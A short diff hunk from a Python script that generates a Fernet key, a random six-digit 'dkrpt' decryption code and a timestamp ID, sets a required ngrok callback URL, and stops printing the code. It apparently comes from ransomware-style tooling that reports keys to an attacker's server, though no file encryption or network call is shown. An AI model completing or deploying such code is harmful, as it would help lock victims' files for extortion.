@@ -21,7 +21,7 @@ key = Fernet.generate_key()
 fe = Fernet(key)
 dkrpt = random.randint(100000, 999999)
 uniqKey = str(datetime.now().time()).strip().replace(':', '').replace('.', '')
-print(dkrpt)
+
 # some GLOBALS
 
 URL = "YOUR_NGROK_URL_HERE"                             # <----  REQUIRED
